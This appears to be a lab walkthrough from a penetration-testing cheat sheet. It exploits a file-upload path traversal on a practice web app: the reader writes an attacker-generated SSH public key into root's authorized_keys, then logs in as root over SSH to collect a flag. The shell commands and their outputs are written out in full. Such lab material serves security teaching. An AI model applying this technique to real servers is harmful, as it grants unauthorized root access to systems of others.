# Using Non-Executable Files

Mountain Desserts Application on Windows
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Non-Executable-Files-18.png)

Failed attempts to access PHP files
>``` shell
>kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
>
># ========== Expected Result ==========
>404 page not found
># =====================================
>
>kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
>
># ========== Expected Result ==========
>404 page not found
># =====================================
>
>kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
>
># ========== Expected Result ==========
>404 page not found
># =====================================
>```

Text file successfully uploaded
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Non-Executable-Files-19.png)

POST request for the file upload of test.txt in Burp
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Non-Executable-Files-20.png)

Relative path in filename to upload file outside of web root
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Non-Executable-Files-21.png)

Prepare authorized_keys file for File Upload
>``` shell
>kali@kali:~$ ssh-keygen
>
># ========== Expected Result ==========
>Generating public/private rsa key pair.
>Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
>Enter passphrase (empty for no passphrase): 
>Enter same passphrase again: 
>Your identification has been saved in fileup
>Your public key has been saved in fileup.pub
>...
># =====================================
>
>kali@kali:~$ cat fileup.pub > authorized_keys
>```

Exploit File Upload to write authorized_keys file in root home directory
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/Using-Non-Executable-Files-22.png)

Using the SSH key to successufully connect via SSH as the root user
>``` shell
>kali@kali:~$ rm ~/.ssh/known_hosts
>
>kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
>
># ========== Expected Result ==========
>The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
>ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
>This key is not known by any other names
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>...
>root@76b77a6eae51:~#
># =====================================
>```

Lab 1 - Follow the steps above on VM #1 to overwrite the authorized_keys file with the file upload mechanism. Connect to the system via SSH on port 2222 and find the flag in /root/flag.txt.
>``` shell
>
>```
>
